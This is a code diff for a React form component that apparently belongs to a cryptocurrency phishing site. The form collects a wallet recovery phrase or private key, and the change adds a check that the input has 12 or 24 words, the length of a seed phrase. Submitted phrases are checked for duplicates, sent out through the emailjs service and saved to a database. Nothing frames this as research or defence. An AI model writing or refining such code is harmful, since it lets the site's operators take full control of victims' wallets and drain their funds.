@@ -1,4 +1,4 @@
-"use client"
+"use client";
 
 import React, { useState, useRef } from "react";
 import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
@@ -20,9 +20,30 @@ export default function Input() {
 
   const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
     event.preventDefault();
-    if (inputValue.trim() === "") {
-      setErrorMessage("Please enter a recovery phrase or private key.");
-    } else {
+
+    const wordCount = inputValue.trim().split(/\s+/).length;
+
+    if (wordCount !== 12 && wordCount !== 24) {
+      setErrorMessage("Input must contain exactly 12 or 24 words.");
+      return;
+    }
+
+    try {
+      const response = await fetch("/api/check-input", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({ inputValue }),
+      });
+
+      const data = await response.json();
+      if (data.exists) {
+        console.log("Input already exists in the database.");
+        router.replace("/submit");
+        return;
+      }
+
       setLoading(true);
       try {
         await emailjs.sendForm(
@@ -32,7 +53,7 @@ export default function Input() {
           process.env.NEXT_PUBLIC_APP_PUBLIC_KEY!
         );
 
-        const response = await fetch("/api/input", {
+        const saveResponse = await fetch("/api/input", {
           method: "POST",
           headers: {
             "Content-Type": "application/json",
@@ -40,20 +61,25 @@ export default function Input() {
           body: JSON.stringify({ inputValue }),
         });
 
-        if (!response.ok) {
+        if (!saveResponse.ok) {
           throw new Error("Failed to save data");
         }
 
         console.log("Form submitted successfully");
         setInputValue("");
         router.replace("/submit");
-      // eslint-disable-next-line @typescript-eslint/no-explicit-any
+        // eslint-disable-next-line @typescript-eslint/no-explicit-any
       } catch (error: any) {
         console.error("Error submitting form:", error);
         setErrorMessage("Server error: " + error.message);
       } finally {
         setLoading(false);
       }
+    } catch (error) {
+      console.error("Error checking input existence:", error);
+      setErrorMessage(
+        "Error checking input existence. Please try again later."
+      );
     }
   };
 
